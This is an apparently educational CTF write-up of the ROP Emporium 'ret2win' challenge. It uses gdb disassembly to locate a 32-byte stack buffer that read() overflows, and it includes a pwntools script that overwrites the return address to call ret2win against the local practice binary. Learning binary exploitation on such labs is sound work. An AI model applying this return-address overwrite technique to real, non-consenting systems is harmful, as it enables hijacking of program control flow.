---
layout: post
title: Ropemporium Ret2win challenge
date: 2021-12-20 21:07 +0300
categories: [ropemporium]
tags: [ctf, ropemporium]
---

> Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.This challenge is classical pwn challenge of overwriting the return address with desired address you want to return to.

The binaries for the challenges can be downloaded from the author`s website [ropemporium](https://ropemporium.com).The goal of first challenge is to call the **ret2win** function.

After downloading the binary, the first is to check binary protection enabled on the binary using `checksec` utility.

```bash
vx@archie:ret2win$ checksec --file ret2win
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Only **NX** (Not executable) is enabled on the binary meaning we cannot execute code stored on the stack like `shellcode`. Toe analyze the behavior of the program we will use `gdb`. gdb is a tool that enables one to inspect the behavior of binaries at runtime.

```nasm
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400756  ret2win
0x0000000000400780  __libc_csu_init
0x00000000004007f0  __libc_csu_fini
0x00000000004007f4  _fini
(gdb)
```

The binary has various functions has as shown in the output above.For initial analysis we start at the `main` function which is the entrypoint of our program.

```nasm
(No debugging symbols found in ret2win)
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400697 <+0>:	push   rbp
   0x0000000000400698 <+1>:	mov    rbp,rsp
   0x000000000040069b <+4>:	mov    rax,QWORD PTR [rip+0x2009b6]        # 0x601058 <stdout@@GLIBC_2.2.5>
   0x00000000004006a2 <+11>:	mov    ecx,0x0
   0x00000000004006a7 <+16>:	mov    edx,0x2
   0x00000000004006ac <+21>:	mov    esi,0x0
   0x00000000004006b1 <+26>:	mov    rdi,rax
   0x00000000004006b4 <+29>:	call   0x4005a0 <setvbuf@plt>
   0x00000000004006b9 <+34>:	mov    edi,0x400808
   0x00000000004006be <+39>:	call   0x400550 <puts@plt>
   0x00000000004006c3 <+44>:	mov    edi,0x400820
   0x00000000004006c8 <+49>:	call   0x400550 <puts@plt>
   0x00000000004006cd <+54>:	mov    eax,0x0
   0x00000000004006d2 <+59>:	call   0x4006e8 <pwnme>
   0x00000000004006d7 <+64>:	mov    edi,0x400828
   0x00000000004006dc <+69>:	call   0x400550 <puts@plt>
   0x00000000004006e1 <+74>:	mov    eax,0x0
   0x00000000004006e6 <+79>:	pop    rbp
   0x00000000004006e7 <+80>:	ret
End of assembler dump.
(gdb)
```

From the initial analysis of the main function,main call an interesting function called **pwnme**. Next is to disassemble **pwnme** function to understand the behavior.

```nasm
(gdb) disas pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:	push   rbp
   0x00000000004006e9 <+1>:	mov    rbp,rsp
   0x00000000004006ec <+4>:	sub    rsp,0x20
   0x00000000004006f0 <+8>:	lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:	mov    edx,0x20
   0x00000000004006f9 <+17>:	mov    esi,0x0
   0x00000000004006fe <+22>:	mov    rdi,rax
   0x0000000000400701 <+25>:	call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:	mov    edi,0x400838
   0x000000000040070b <+35>:	call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:	mov    edi,0x400898
   0x0000000000400715 <+45>:	call   0x400550 <puts@plt>
   0x000000000040071a <+50>:	mov    edi,0x4008b8
   0x000000000040071f <+55>:	call   0x400550 <puts@plt>
   0x0000000000400724 <+60>:	mov    edi,0x400918
   0x0000000000400729 <+65>:	mov    eax,0x0
   0x000000000040072e <+70>:	call   0x400570 <printf@plt>
   0x0000000000400733 <+75>:	lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:	mov    edx,0x38
   0x000000000040073c <+84>:	mov    rsi,rax
   0x000000000040073f <+87>:	mov    edi,0x0
   0x0000000000400744 <+92>:	call   0x400590 <read@plt>
   0x0000000000400749 <+97>:	mov    edi,0x40091b
   0x000000000040074e <+102>:	call   0x400550 <puts@plt>
   0x0000000000400753 <+107>:	nop
   0x0000000000400754 <+108>:	leave
   0x0000000000400755 <+109>:	ret
End of assembler dump.
```

From analysis of the above assembly code, we fill a buffer of size 0x20(32bytes) with a constant byte of zero. **memset** is used to overwrite any values present memory area specified. The memory we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32 bytes from the address of base pointer as shown in the stack diagram below.

![](/assets/images/ropemporium/stack.png)

Next function is **read** function, which reads from the standard input file descriptor and stores in the specified buffer.From the disassembled code we are reading 0x38 bytes from the user input and storing it in our buffer.

```c
read(0, *[rbp-0x20], 0x38) //0 is file descriptor stdin
```

Because we are reading more than what the buffer can hold, we corrupt the adjacent memory regions therefore causing a stack buffer overflow. Therefore in order to control the return address as shown in the stack image above is to fill the buffer, overwrite the `rbp` register and control the return address with **ret2win** function address.

The exploit code for this ret2win function is,

```python
import pwn

pwn.context.encoding = "latin-1"
pwn.warnings.simplefilter("ignore")
pwn.context.arch = "amd64"

io = pwn.process('./ret2win')

payload = b"A" * 32 # fill the buffer
payload += b"B" * 8  #overwrite saved base pointer
payload += pwn.p64(0x400756)  #Address of ret2win function
io.writeafter('>', payload)

pwn.info(io.clean().decode())
```

Running the above script we get correct flag.

```bash
vx@archie:ret2win$ python3 x.py
[+] Starting local process './ret2win': pid 45427
[*]  Thank you!
    Well done! Here's your flag:
    ROPE{a_placeholder_32byte_flag!}
[*] Process './ret2win' stopped with exit code 0 (pid 45427)
```
